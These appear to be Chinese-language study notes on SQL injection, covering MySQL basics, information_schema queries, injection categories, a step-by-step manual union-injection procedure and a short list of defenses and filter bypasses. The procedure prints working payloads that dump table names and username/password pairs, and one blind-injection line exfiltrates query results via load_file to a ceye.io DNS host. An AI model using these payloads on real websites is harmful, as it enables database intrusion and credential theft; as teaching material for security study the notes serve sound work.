# SQL注入相关概念

> 			把SQL命令插入到web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令未对用户提交的参数数据进行校验或有效的过滤，直接进行SQL语句拼接，改变了原有SQL语句语义，传入数据库解析引擎中执行
>
> 			```sql
> 			数据库相关概念
> 				基本概念
> 					数据（DATA）
> 					数据库（DATABASE）
> 					数据库管理系统（DBMS）
> 					结构化查询语言（SQL）
> 				基本语句
> 					增
> 						insert into user(id,name) values("64082","lxb")
> 					删
> 						delete from ‘user’ where id=1
> 					改
> 						update user set name=“xb” where id=“64082”
> 					查
> 						select * from ‘user’ where id=1
> 					order by
> 						默认升序排序
> 							select * from ‘user’ order by id
> 						利用order by判断列数
> 							url?id=8 order by 18 回显正常
> 							url?id=8 order by 19 回显异常
> 							以上说明当前表有18列
> 			```



## information_schema的默认表

```sql
MySQL系统数据库information_schema
	SCHEMATE表
		查询所有列名
			DESC information_schema.schemata
		查询所有数据库名
			select distinct schema_name from schemata
	TABLES表
		所有数据库名table_schema
		所有表名table_name
			select distinct table_name from information_schema.tables
	COLUMNS表
		查询所有列名
			DESC information_schema.columns
		查询当前数据库所有列
			select distinct column_name from information_schema.columns
```



## MySQL函数

```sql
MySQL函数
	system_user() 系统用户名
	user() 用户名
	current_user() 当前用户名
	session_user() 连接数据库用的用户名
	database() 数据库名
	version() 数据库版本
	load_file() 读取本地文件
	@@datadir 数据库路径
	@@basedir 安装路径
	@@version_compile_os 操作系统
```



## SQL注入作用与分类

```sql
SQL注入作用
	绕过登录验证
	获取敏感数据
	文件操作系统
	注册表操作
	执行系统命令
SQL注入分类
	按照数据类型
		数字型
			id=1' 异常
			id=1 and 1=1 正常
			id=1 and 1=2 返回数据不同
		字符型
			username=‘test and 1=1’ 无法注入
			username=‘test’ and ‘1’=‘1’ --‘ 闭合字符串才可以注入
	按照注入方法
		显错注入
		联合注入
		盲注
		延时注入
```



## 手工注入逻辑

```sql
手工注入的流程
	测试语句
		数字型
		字符型
	判断注入点
	判断数据库类型
		报错信息
		脚本语言
		连接符
	联合注入
		0.判断注入点
		1.判断列数
			order by 4正常
			order by 5异常
			列数为4
		2.判断回显位
			?id=-1 union select 1,2,3,4
		3.爆数据库名
			?id=-1 union select 1,database(),group_concat(schema_name),4 from information_schema.schemata
		4.爆表名
			?id=-1 union select 1,‘表名’,group_concat(table_name),4 from information_schema.tables where table_schema='test'
		5.爆列名
			?id=-1 union select 1,'列名',group_concat(column_name),4 from information_schema.columns where table_name='table'
		6.爆内容
			?id=-3 union select 1,'用户名密码',group_concat(username,0x5c,password),4 from yzsoumember
	显错注入
	盲注
		select load_file(concat('\\\\','攻击语句',.XXX.ceye.io\\abc))
	延时注入
	文件读取
	文件写入
	Access数据库注入
```



### 联合注入

```sql
手工注入逻辑
		1.判断注入点
			'
			"
		2.判断对方查询的字段数以及回复位置
			1’ union select 1;
			1’ union select 1,2;
		3.判断数据库名称以及版本号
			1‘ union select database(),version();
		4.获取表名
			1’ union select 1,table_name from information_schema.tables where table_schema="user" limit 1,4
		5.获取字段名
			1‘ union select 1,column_name from information_schema.columns  where table_name="user" limit% 1,8
		6.获取内容
			1’ union select 1,concat(name,pass) from user
```



### 盲注







## SQL注入防御与绕过

```sql
防御与绕过
	危害
		数据库信息泄露
		网页篡改
		网站挂马
		数据库恶意被操作
		服务器远程被控制
		破坏硬盘数据
	防御
		过滤
		预处理
	绕过
		关键字大小写
		双写关键字
		编码
		注释
		内敛注释
		特殊符号
		运算符
		等价函数
		缓冲区溢出
		替换
```

